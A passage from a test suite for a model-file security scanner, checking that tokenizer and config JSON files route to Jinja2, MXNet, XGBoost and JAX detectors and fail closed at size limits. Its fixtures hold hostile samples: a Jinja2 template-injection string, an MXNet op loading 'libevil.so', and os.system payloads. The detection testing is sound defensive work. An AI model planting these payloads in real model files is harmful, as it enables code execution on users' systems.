    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":["classification"],"padding":"' + ("x" * 256) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_oversized_generic_json_with_mxnet_heads_shape_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":[[0,0,0]],"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_oversized_generic_json_with_hidden_mxnet_graph_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_inconclusive_mxnet_config_preserves_jinja_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path), config={"cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_inconclusive_mxnet_tokenizer_config_preserves_direct_jinja_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    tokenizer_path = tmp_path / "tokenizer_config.json"
    tokenizer_path.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_large_hf_tokenizer_json_does_not_run_binary_json_scanners(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {"padding": "x" * 256},
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is True
    assert result.scanner_name not in {"manifest", "jinja2_template", "mxnet", "xgboost"}
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "MXNet Symbol Routing" for check in result.checks)
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


def test_scan_file_oversized_hf_tokenizer_json_does_not_fail_closed_as_mxnet(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {"padding": "x" * (file_detection.TOKENIZER_JSON_ROUTING_READ_BYTES + 1024)},
    )
    assert tokenizer_path.stat().st_size > file_detection.TOKENIZER_JSON_ROUTING_READ_BYTES

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is True
    assert result.scanner_name not in {"manifest", "jinja2_template", "mxnet", "xgboost"}
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "MXNet Symbol Routing" for check in result.checks)


@pytest.mark.parametrize("scanners", [None, ["jinja2_template"], ["mxnet"], ["jax_checkpoint"]])
def test_scan_file_large_hf_tokenizer_json_with_vocab_jinja_tokens_is_benign_for_selected_scanners(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    scanners: list[str] | None,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    tokenizer_dir = tmp_path / "onnx"
    tokenizer_dir.mkdir()
    tokenizer_path = _write_hf_tokenizer_json(
        tokenizer_dir / "tokenizer.json",
        {
            "model": {
                "type": "BPE",
                "vocab": {
                    "{{": 0,
                    "template": 1,
                    "framework": 2,
                    "nodes": 3,
                    **{f"piece_{index}": index + 4 for index in range(80)},
                },
                "merges": [],
            },
        },
    )
    config: dict[str, Any] = {"cache_scan_results": False}
    if scanners is not None:
        config["scanners"] = scanners

    result = scan_file(str(tokenizer_path), config=config)

    assert result.success is True
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "MXNet Symbol Routing" for check in result.checks)
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_scan_file_oversized_tokenizer_json_late_chat_template_preserves_jinja_detection(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "model": {
                "type": "Unigram",
                "vocab": [[f"piece_{index}", -float(index)] for index in range(80)],
            },
            "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_model_template_after_vocab_probe_boundary_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    vocab_entries = ",".join(f'"piece_{index}":{index}' for index in range(80))
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        model_fields=(
            f'"type":"BPE","vocab":{{{vocab_entries}}},'
            '"template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","merges":[]'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert tokenizer_path.stat().st_size > file_detection.TOKENIZER_JSON_ROUTING_READ_BYTES
    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_model_template_after_merges_probe_boundary_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 256)
    merges = ",".join(json.dumps(f"piece_{index} piece_{index + 1}") for index in range(80))
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        model_fields=(
            f'"type":"BPE","vocab":{{"hello":0}},"merges":[{merges}],'
            '"template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert tokenizer_path.stat().st_size > file_detection.TOKENIZER_JSON_ROUTING_READ_BYTES
    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_root_template_between_probe_and_suffix_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 128)
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 128)
    monkeypatch.setattr(file_detection, "_STRUCTURED_JSON_TRAILING_READ_BYTES", 64)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=',"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","tail":"' + ("y" * 256) + '"',
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert tokenizer_path.stat().st_size > file_detection.TOKENIZER_JSON_ROUTING_READ_BYTES
    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_escaped_jinja_string_between_probe_and_suffix_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 128)
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 128)
    monkeypatch.setattr(file_detection, "_STRUCTURED_JSON_TRAILING_READ_BYTES", 64)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"metadata":"\\u007b\\u007b \'\'.__class__.__mro__[1].__subclasses__() \\u007d\\u007d",'
            '"tail":"' + ("y" * 256) + '"'
        ),
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_escaped_chat_template_preserves_jinja_detection(tmp_path: Path) -> None:
    tokenizer_path = tmp_path / "tokenizer.json"
    malicious_template = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    tokenizer_path.write_text(
        (
            '{"version":"1.0","added_tokens":[],'
            '"model":{"type":"BPE","vocab":{"hello":0},"merges":[]},'
            f'"chat\\u005ftemplate":{json.dumps(malicious_template)}}}'
        ),
        encoding="utf-8",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_mxnet_root_preempts_template_evidence(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "post_processor": {
                "type": "TemplateProcessing",
                "template": "{{ harmless_user_name }}",
                "special_tokens": [{"id": "[SEP]", "ids": [102], "tokens": ["[SEP]"]}],
            },
            "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
            "arg_nodes": [0],
            "heads": [[0, 0, 0]],
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_oversized_tokenizer_template_preempts_selected_jax(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "model": {
                "type": "Unigram",
                "vocab": [[f"piece_{index}", -float(index)] for index in range(80)],
            },
            "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "framework": "jax",
        },
    )

    result = scan_file(
        str(tokenizer_path),
        config={"cache_scan_results": False, "scanners": ["jax_checkpoint", "jinja2_template"]},
    )

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_oversized_tokenizer_model_template_after_vocab_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "model": {
                "type": "Unigram",
                "vocab": [[f"piece_{index}", -float(index)] for index in range(80)],
                "template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            },
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_model_vocab_after_structure_probe_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 256)
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "model": {
                "type": "Unigram",
                "vocab": [[f"piece_{index}", -float(index)] for index in range(80)],
            },
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)
    assert any(check.name == "MXNet Symbol Routing" for check in result.checks)


def test_scan_file_tokenizer_template_preserves_explicit_jax_selection(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "chat_template": "{{ harmless_user_name }}",
            "framework": "jax",
            "payload": "jax.experimental.host_callback.call(os.system, 'id')",
        },
    )

    result = scan_file(
        str(tokenizer_path),
        config={"cache_scan_results": False, "scanners": ["jax_checkpoint"]},
    )

    assert result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_default_json_routing_requires_positive_jax_evidence(tmp_path: Path) -> None:
    generic_path = tmp_path / "generic.json"
    generic_path.write_text(
        json.dumps({"padding": "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)}),
        encoding="utf-8",
    )

    result = scan_file(str(generic_path), config={"cache_scan_results": False})

    assert result.scanner_name != "jax_checkpoint"
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_selected_jax_preserves_ambiguous_json_fail_closed(tmp_path: Path) -> None:
    generic_path = tmp_path / "generic.json"
    generic_path.write_text(
        json.dumps({"padding": "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)}),
        encoding="utf-8",
    )

    result = scan_file(
        str(generic_path),
        config={"cache_scan_results": False, "scanners": ["jax_checkpoint"]},
    )

    assert result.scanner_name == "jax_checkpoint"
    assert result.success is False
    assert "jax_json_checkpoint_analysis_size_limit" in result.metadata.get("scan_outcome_reasons", [])
    assert any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_file_oversized_tokenizer_json_late_mxnet_root_preserves_mxnet_detection(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "model": {
                "type": "Unigram",
                "vocab": [[f"piece_{index}", -float(index)] for index in range(80)],
            },
            "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
            "arg_nodes": [0],
            "heads": [[0, 0, 0]],
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_oversized_tokenizer_json_late_jax_root_preserves_selected_jax_detection(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_READ_BYTES", 256)
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "model": {
                "type": "Unigram",
                "vocab": [[f"piece_{index}", -float(index)] for index in range(80)],
            },
            "framework": "jax",
            "payload": "jax.experimental.host_callback.call(os.system, 'id')",
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False, "scanners": ["jax_checkpoint"]})

    assert result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_tokenizer_json_vocab_template_token_does_not_route_unrelated_scanners(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        model_fields='"type":"BPE","vocab":{"{{":0,"{%":1,"hello":2},"merges":[]',
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is True
    assert result.scanner_name not in {"jinja2_template", "mxnet", "xgboost", "jax_checkpoint"}
    assert result.metadata["scanner_dependency_ids"] == ["unknown"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)
    assert not any(check.name == "MXNet Symbol Routing" for check in result.checks)
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_file_tokenizer_json_nested_template_preserves_jinja_detection(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "post_processor": {
                "type": "TemplateProcessing",
                "template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "single": "$A:0 [SEP]:0",
                "pair": "$A:0 [SEP]:0 $B:1 [SEP]:1",
                "special_tokens": [{"id": "[SEP]", "ids": [102], "tokens": ["[SEP]"]}],
            }
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_benign_nested_template_has_no_ssti_finding(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "post_processor": {
                "type": "TemplateProcessing",
                "template": "$A:0 [SEP]:0",
                "single": "$A:0 [SEP]:0",
                "pair": "$A:0 [SEP]:0 $B:1 [SEP]:1",
                "special_tokens": [{"id": "[SEP]", "ids": [102], "tokens": ["[SEP]"]}],
            }
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is True
    assert result.scanner_name == "jinja2_template"
    assert not any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_late_chat_template_preserves_jinja_detection(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {"chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"},
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_late_xgboost_markers_preserve_xgboost_detection(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "version": [1, 7, 4],
            "learner": {"gradient_booster": {}, "malicious_code": "os.system()"},
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(check.name == "JSON Content Analysis" and check.status == CheckStatus.FAILED for check in result.checks)


def test_scan_file_tokenizer_json_late_mxnet_markers_preserve_mxnet_detection(tmp_path: Path) -> None:
    tokenizer_path = _write_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        {
            "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
            "arg_nodes": [0],
            "heads": [[0, 0, 0]],
        },
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_tokenizer_json_late_chat_template_after_structure_budget_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=',"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"',
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_directory_tokenizer_json_late_chat_template_after_structure_budget_preserves_jinja(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=',"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"',
        padding_size=256,
    )

    result = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert result.files_scanned == 1
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_late_xgboost_after_structure_budget_preserves_xgboost(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=',"learner":{"gradient_booster":{},"malicious_code":"os.system()"}',
        padding_size=256,
        version_json="[1,7,4]",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(check.name == "JSON Content Analysis" and check.status == CheckStatus.FAILED for check in result.checks)


def test_scan_file_tokenizer_json_late_mxnet_after_structure_budget_preserves_mxnet(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
            '"arg_nodes":[0],"heads":[[0,0,0]]'
        ),
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_tokenizer_json_late_mxnet_after_mxnet_budget_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 128)
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 192)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
            '"arg_nodes":[0],"heads":[[0,0,0]]'
        ),
        padding_size=256,
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "MXNet Symbol Routing" and "bounded JSON probe reached its limit" in check.message
        for check in result.checks
    )


def test_scan_file_tokenizer_json_late_xgboost_jax_overlap_after_structure_budget_merges_xgboost(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "TOKENIZER_JSON_ROUTING_STRUCTURE_READ_BYTES", 192)
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
            '"framework":"jax",'
            '"payload":"jax.experimental.host_callback.call(os.system, \'id\')"'
        ),
        padding_size=256,
        version_json="[1,7,4]",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert set(result.metadata["scanner_dependency_ids"]) >= {"jax_checkpoint", "xgboost"}
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert (
        sum(check.name == "JSON Content Analysis" and check.status == CheckStatus.FAILED for check in result.checks)
        == 1
    )


def test_scan_file_tokenizer_json_jax_identity_preserves_jax_checkpoint_analysis(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(',"framework":"jax","payload":"jax.experimental.host_callback.call(os.system, \'id\')"'),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert not any(check.name == "Template Extraction" for check in result.checks)


def test_scan_file_tokenizer_json_non_jax_identity_does_not_merge_jax(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"framework":"transformers",'
            '"chat_template":"{{ harmless_user }}",'
            f'"padding":"{"x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)}"'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_file_tokenizer_json_library_jax_identity_composes_jinja_template_analysis(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"library":"jax",'
            '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
            '"chat_template":"{{ harmless_user }}"'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_tokenizer_json_jax_identity_composes_jinja_template_analysis(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"framework":"jax",'
            '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
            '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_tokenizer_json_jax_library_identity_composes_jinja_template_analysis(tmp_path: Path) -> None:
    tokenizer_path = _write_ordered_hf_tokenizer_json(
        tmp_path / "tokenizer.json",
        late_fields=(
            ',"library":"jax",'
            '"payload":"jax.experimental.host_callback.call(os.system, \'id\')",'
            '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"'
        ),
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jinja2_template"
    assert set(result.metadata["scanner_dependency_ids"]) >= {"jinja2_template", "jax_checkpoint"}
    assert any(
